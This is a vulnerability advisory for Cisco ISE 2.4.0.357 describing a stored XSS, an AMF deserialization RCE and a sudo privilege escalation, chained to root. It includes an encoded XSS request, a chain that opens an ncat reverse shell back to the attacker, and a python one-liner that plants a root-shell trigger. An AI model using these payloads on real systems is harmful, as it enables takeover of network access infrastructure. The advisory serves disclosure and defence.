>> Multiple vulnerabilities in Cisco Identity Services Engine (Unauth XSS to RCE as root)
>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security and Dominik Czarnota (dominik.b.czarnota@gmail.com)
=================================================================================
Disclosure: 20/01/2019 / Last updated: 05/02/2019


>> Background and product information
From the vendor's website [1]:
The Cisco Identity Services Engine (ISE) is your one-stop solution to streamline security policy management and reduce operating costs. With ISE, you can see users and devices controlling access across wired, wireless, and VPN connections to the corporate network.

Cisco ISE allows you to provide highly secure network access to users and devices. It helps you gain visibility into what is happening in your network, such as who is connected, which applications are installed and running, and much more. It also shares vital contextual data, such as user and device identities, threats, and vulnerabilities with integrated solutions from Cisco technology partners, so you can identify, contain, and remediate threats faster."


>> Summary
ISE is distributed by Cisco as a virtual appliance. We have analysed version 2.4.0.357 and found three vulnerabilities: an unauthenticated stored cross site scripting, a authenticated Java deserialization vulnerability leading to remote code execution as an unprivileged user, and a privilege escalation from that unprivileged user to root.

By putting them all together, we can achieve remote code execution as root, provided we can trap an administrator into visiting the page vulnerable to the stored cross site scripting. A Ruby exploit that implements this full exploit chain (described in more detail at 'Exploitation summary', at the end of this file) is available in [2].

All the vulnerabilities in this advisory were found independently by Agile Information Security. However, vulnerability #2 (Unsafe Flex AMF Java Object Deserialization) was also found and reported to Cisco by Olivier Arteau of Groupe Technologie Desjardins [3] and vulnerability #3 (Privilege Escalation via Incorrect sudo File Permissions) was also found and reported to Cisco by Hector Cuesta [4].

Cisco refused to credit Agile Information Security with finding vulnerabilities #2 and #3, and also refused to provide a CVE for both these vulnerabilities, saying regarding #3 that "This issue has been evaluated as a hardening effort to improve the security posture of the device. According with our Security vulnerability policy, we request do not request a CVE assignment for issue with a Severity Impact Rating (SIR) lower than Medium. This issue will be fixed in the upcoming ISE release". 
At the time of the latest update, Cisco still recommends version 2.4.0.357 - affected by all the vulnerabilities in this advisory - as the "Suggested Release" in their software download page.

These actions show Cisco is incredibly negligent with regards to the security of their customers. They are still shipping (and recommending) a product version vulnerable to unauthenticated remote code execution, with a fully working public exploit and no way to track fixes or fixed versions for these vulnerabilities.

Agile Information Security would like to thank Beyond Security's SSD Secure Disclosure programme for helping us disclose these vulnerabilities to Cisco, and publishing the advisory on their site [5].


>> Technical details:
#1
Vulnerability: Stored Cross Site Scripting
CVE-2018-15440
Attack Vector: Remote
Constraints: None; exploitable by an unauthenticated attacker
Affected versions: confirmed on ISE virtual appliance v2.4.0.357

The LiveLogSettingsServlet, available at /admin/LiveLogSettingsServlet, contains a stored cross site scripting vulnerability.
The doGet() HTTP request handler takes in an Action parameter as a HTTP query variable, which can be "read" or "write". 
With the "write" parameter, it calls the writeLiveLogSettings() function which then takes several query string variables, such as Columns, Rows, Refresh_rate and Time_period.
The content of these query string variables is then written to /opt/CSCOcpm/mnt/dashboard/liveAuthProps.txt, and the server responds with a 200 OK. These parameters are not validated, and can contain any text.

When the Action parameter equals "read", the servlet will read the /opt/CSCOcpm/mnt/dashboard/liveAuthProps.txt file and display it back to the user with the Content-Type "text/html", causing whatever was written to that file to be rendered and executed by the browser.

To mount a simple attack, we can send the following request:
GET /admin/LiveLogSettingsServlet?Action=write&Columns=1&Rows=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&Refresh_rate=1337&Time_period=1337

Which can then be triggered with:
GET /admin/LiveLogSettingsServlet?Action=read HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
Content-Length: 164
Server:  

<Settings>
<Columns>
<Col>1</Col>
</Columns>
<Rows><script>alert(1)</script></Rows>
<Refresh_rate>1337</Refresh_rate>
<Time_period>1337</Time_period>
</Settings>

This vulnerability can be exploited by an unauthenticated attacker.


#2
Vulnerability: Unsafe Flex AMF Java Object Deserialization
CVE-2017-5641; Please be aware this CVE is not specific to Cisco ISE
Attack Vector: Remote
Constraints: Requires authentication to the admin web interface
Affected versions: confirmed on ISE virtual appliance v2.4.0.357

By sending an HTTP POST request with random data to /admin/messagebroker/amfsecure, the server will respond with a 200 OK and binary data that includes:
 ...Unsupported AMF version XXXXX...
 
Which indicates that the server has a Apache / Adobe Flex AMF (BlazeDS) endpoint at that location. The BlazeDS library version running on the server is 4.0.0.14931, which means it is vulnerable to CVE-2017-5641 [6], the description of which is stated below:
"Previous versions of Apache Flex BlazeDS (4.7.2 and earlier) did not restrict which types were allowed for AMF(X) object deserialization by default. During the deserialization process code is executed that for several known types has undesired side-effects. Other, unknown types may also exhibit such behaviors. One vector in the Java standard library exists that allows an attacker to trigger possibly further exploitable Java deserialization of untrusted data. Other known vectors in third party libraries can be used to trigger remote code execution."

This vulnerability was previously exploited in DrayTek VigorACS by Agile Information Security, as it can be seen in [7] and [8]. Please refer to that advisory and exploit, as well as [9], [10] and [11] for further details on this vulnerability.

We were able to re-use some of the exploit code in [7] from the VigorACS vulnerability to create a binary AMF payload that will execute on the server as the iseadminportal user (see Appendix A). 

The the exploit chain works in the same way as the previous one:
a) sends an AMF binary payload to /admin/messagebroker/amfsecure as described in [10] to trigger a Java Remote Method Protocol (JRMP) call back to the attacker
b) receives the JRMP connection with ysoserial's JRMP listener [12]
c) calls ysoserial with the ROME payload, as a vulnerable version of Rome (1.0 RC2) is in the Java classpath of the server
d) execute ncat (the binary is on the ISE virtual appliance) and return a reverse shell running as the iseaminportal user

Appendix A contains the Java code used to generate the AMF payload that will be sent in step a). This code is very similar to the one in [10], and it is highly recommended to read that advisory by Markus Wulftange of Code White for a better understanding of this vulnerability.

This vulnerability can only be exploited by an authenticated attacker with access to the administrative portal.


#3
Vulnerability: Privilege Escalation via Incorrect sudo File Permissions
No CVE assigned; track as SSD-3778
Attack Vector: Local
Constraints: Requires a command shell running as the iseadminportal user
Affected versions: confirmed on ISE virtual appliance v2.4.0.357

The iseadminportal user can run a variety of commands as root via sudo (output of 'sudo -l'):
    (root) NOPASSWD: /opt/CSCOcpm/bin/resetMntDb.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/resetMnTSessDir.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/setdbpw.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/sync_export.sh *

    (root) NOPASSWD: /opt/CSCOcpm/upgrade/bin/deleteguest.sh *
    (root) NOPASSWD: /opt/CSCOcpm/upgrade/bin/iseupgrade-dbexport.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/pxgrid_backup.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/pxgrid_restore.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/pxgrid_sync.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/pbis_monit.sh *
    (root) NOPASSWD: /opt/CSCOcpm/prrt/bin/FIPS_lockdown.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/iseupgradeui.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/show_iowait.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/kerberosprobe.sh *
    (root) NOPASSWD: /opt/CSCOcpm/bin/sxp-servercontrol.sh *
...

However all of the files above are writeable by the iseadminportal user. This makes it trivial to perform privilege escalation to root. All that is needed to do is to edit the files, and add a "/bin/sh" to the second and / or last line, then run the script as sudo to get a root shell.


>> Exploitation summary:
By now you should have a decent idea of how to build a full exploit chain. Since vulnerability #2 (AMF RCE) can only be exploited by an authenticated administrator, we can set up a trap using vulnerability #1 (stored XSS) as an unauthenticated attacker.

By abusing the stored cross site scripting, we can create a malicious Javascript (see Appendix B) that will be stored in /admin/LiveLogSettingsServlet. If a logged in user visits that page the Javascript payload will send a XMLHttpRequest to /admin/messagebroker/amfsecure with the payload created by the Java code in Appendix A, and start the exploit described in vulnerability #2 (AMF RCE) to obtain a reverse shell as the iseadminuser.

Once we have the reverse shell, we can run the following command to abuse vulnerability #3 (privilege escalation):
python -c 'import os;f=open("/opt/CSCOcpm/bin/file-info.sh", "a+", 0);f.write("if [ \"$1\" == 1337 ];then\n/bin/bash\nfi\n");f.close();os.system("sudo /opt/CSCOcpm/bin/file-info.sh 1337")'

This will add an "if" clause at the end of /opt/CSCOcpm/bin/file-info.sh that looks for the "1337" parameter, and executes /bin/bash as root when it sees it. That way we won't mess with any important system functionality that might use that file, and we will get our full root shell.

The full exploit, written in Ruby, is available in [2].


>> Fix:
Cisco claims vulnerability #1 is fixed in version 2.2.0.913. It is unknown if it is fixed in versions 2.4.x.
Cisco claims vulnerability #2 is fixed in version 2.4.0.905.
By Cisco's own admission, vulnerability #3 is not fixed at the time of the latest update to this advisory.

Please note that Agile Information Security does not verify any fixes, except when noted in the advisory or requested by the vendor. The vendor fixes might be ineffective or incomplete, and it is the vendor's responsibility to ensure the vulnerablities found by Agile Information Security are resolved properly.
